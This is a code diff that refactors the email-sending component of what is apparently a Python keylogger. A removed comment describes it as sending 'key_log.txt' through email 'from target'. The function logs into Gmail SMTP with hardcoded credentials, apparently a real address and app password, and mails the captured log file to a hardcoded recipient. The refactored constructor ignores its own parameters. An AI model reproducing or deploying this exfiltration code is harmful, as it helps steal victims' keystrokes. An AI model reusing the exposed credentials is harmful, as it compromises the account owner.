@@ -4,48 +4,39 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-email_address = "vikramathithyan99@gmail.com"
-password = "jguinpzxcwsksieu"
-toaddress = "suriyaseyon6@gmail.com"
+class EmailSender:
+    def __init__(self, email_address, password, toaddress):
+        self.email_address = "vikramathithyan99@gmail.com"
+        self.password = "jguinpzxcwsksieu"
+        self.toaddress = "suriyaseyon6@gmail.com"
 
+    def send_mail(self, filename, attachment, toaddr):
+        fromaddr = self.email_address
 
-# function to send the key_log.txt file through email from target
-def send_mail(filename, attachment, toaddr):
-    fromaddr = email_address
+        msg = MIMEMultipart()
 
-    msg = MIMEMultipart()
+        msg['From'] = fromaddr
+        msg['To'] = toaddr
+        msg['Subject'] = "Log File"
 
-    msg['From'] = fromaddr
+        body = "Body_of_the_mail"
+        msg.attach(MIMEText(body, 'plain'))
 
-    msg['To'] = toaddr
+        attachment_file = open(attachment, 'rb')
+        attachment_payload = attachment_file.read()
+        attachment_file.close()
 
-    msg['Subject'] = "Log File"
+        attachment_part = MIMEBase('application', 'octet-stream')
+        attachment_part.set_payload(attachment_payload)
+        encoders.encode_base64(attachment_part)
+        attachment_part.add_header('Content-Disposition', f"attachment; filename = {filename}")
+        msg.attach(attachment_part)
 
-    body = "Body_of_the_mail"
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        s.starttls()
+        s.login(fromaddr, self.password)
 
-    msg.attach(MIMEText(body, 'plain'))
+        text = msg.as_string()
+        s.sendmail(fromaddr, toaddr, text)
 
-    filename = filename
-    attachment = open(attachment, 'rb')
-
-    p = MIMEBase('application', 'octet-stream')
-
-    p.set_payload(attachment.read())
-
-    encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
-
-    msg.attach(p)
-
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-
-    s.starttls()
-
-    s.login(fromaddr, password)
-
-    text = msg.as_string()
-
-    s.sendmail(fromaddr, toaddr, text)
-
-    s.quit()
+        s.quit()
